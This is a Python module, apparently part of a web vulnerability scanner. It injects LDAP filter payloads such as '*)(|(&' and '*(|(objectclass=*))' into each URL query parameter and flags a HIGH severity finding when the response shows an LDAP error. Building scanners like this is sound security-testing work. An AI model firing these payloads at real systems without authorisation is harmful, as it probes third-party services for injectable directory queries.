"""GECKO APOCALYPSE - LDAP Injector"""

import asyncio
from typing import Dict, List
from urllib.parse import parse_qs, urlencode, urlparse

import aiohttp


class LDAPInjector:
    def __init__(self, session, config, db):
        self.session = session
        self.config = config
        self.db = db

    async def scan(self, url, content, headers, response):
        findings = []
        params = parse_qs(urlparse(url).query)
        payloads = ["*", "*)(|(&", "admin*)", "*(|(objectclass=*))", "*)((|uid=*)"]

        for param in params:
            for p in payloads:
                test = self._inject(url, param, p)
                try:
                    async with self.session.get(
                        test, timeout=aiohttp.ClientTimeout(total=10)
                    ) as r:
                        c = await r.text(errors="ignore")
                        if any(
                            e in c
                            for e in [
                                "LDAPException",
                                "com.sun.jndi.ldap",
                                "Search: Bad search filter",
                            ]
                        ):
                            findings.append(
                                {
                                    "type": "LDAP Injection",
                                    "severity": "HIGH",
                                    "url": url,
                                    "parameter": param,
                                    "payload": p,
                                    "evidence": "LDAP error returned in response",
                                    "cwe": "CWE-90",
                                    "owasp": "A03:2021",
                                }
                            )
                            break
                except:
                    pass
        return findings

    def _inject(self, url, param, value):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()
